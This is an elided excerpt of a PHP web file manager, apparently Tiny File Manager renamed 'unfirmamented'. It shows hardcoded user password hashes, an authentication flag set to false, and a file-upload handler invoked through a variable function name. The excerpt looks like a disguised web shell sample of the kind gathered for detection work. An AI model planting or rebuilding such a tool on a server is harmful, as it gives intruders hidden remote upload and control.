...
define('APP_TITLE', 'unfirmamented');

$dauth = false;

$auth_users = array(
    'admin' => 'ae3d060edb6130e0c549403ad6bd6ee1',
    'user' => 'ae3d060edb6130e0c549403ad6bd6ee1'
);
...
$is_https = isset($_SERVER['HTTPS']) and ($_SERVER['HTTPS'] == 'on' || $_SERVER['HTTPS'] == 1)
...
if (!empty($_FILES) and !FM_READONLY) {
    ...
    if ( is_writable($targetPath) ) {
        ...
        if (empty($f['file']['error']) and !empty($tmp_name) and $tmp_name != 'none' and $isFileAllowed) {
            ...
            } else if ($fnder($tmp_name, $fullPath)) {
                if ( file_exists($fullPath) ) {
                    $response = array (
                        'status'    => 'success',
                        'info' => "file upload successful"
            ...
            <div class="card-body">
                <div class="row">
                    <div class="col-xs-12 col-sm-6">
                        <p><h3><a href="." target="_blank" class="app-v-title"> unfirmamented <?php echo VERSION; ?></a></h3></p>
                    </div>
                    <div class="col-xs-12 col-sm-6">
                        <div class="card">
...
<form action="" method="post" class="pt-3">
    ...
    <div class="row">
        ...
        <div class="col-3 d-none d-sm-block"><a href="." target="_blank" class="float-right text-muted">unfirmamented <?php echo VERSION; ?></a></div>
        <?php else: ?>
            <div class="col-12"><a href="." target="_blank" class="float-right text-muted">unfirmamented <?php echo VERSION; ?></a></div>
        <?php endif; ?>
    </div>
</form>
 ...
 class FM_Config
{
    ...
    function __construct()
    {
        ...
        if (strlen($CONFIG)) {
            ...
            $msg = 'unfirmamented<br>Error: Cannot load configuration';
            if (substr($fm_url, -1) == '/') {
                $fm_url = rtrim($fm_url, '/');
                $msg .= '<br>';
...
<head>
    ...
    <meta name="description" content="unfirmamented">
...
function lng($txt) {
    ...
    // English Language
    $tr['en']['AppName']        = 'unfirmamented';      $tr['en']['AppTitle']           = 'unfirmamented';
